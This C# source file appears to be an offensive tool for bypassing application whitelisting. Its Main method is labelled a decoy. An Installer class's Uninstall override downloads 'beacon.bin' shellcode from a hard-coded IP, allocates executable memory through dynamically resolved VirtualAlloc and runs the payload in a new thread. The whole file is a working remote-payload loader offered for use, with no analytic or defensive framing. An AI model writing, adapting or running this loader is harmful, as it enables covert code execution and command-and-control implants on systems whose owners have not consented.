using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
    
        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            byte[] shellcode;
            using (var client = new WebClient())
            {
                client.BaseAddress = "http://192.168.45.212";
                shellcode = client.DownloadData("beacon.bin");
            }
            var hKernel = LoadLibrary("kernel32.dll");
            var hVa = GetProcAddress(hKernel, "VirtualAlloc");
            var hCt = GetProcAddress(hKernel, "CreateThread");

            var va = Marshal.GetDelegateForFunctionPointer<AllocateVirtualMemory>(hVa);
            var ct = Marshal.GetDelegateForFunctionPointer<CreateThread>(hCt);

            var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
            Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);

            var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(t, 0xFFFFFFFF);
        }
    }
}
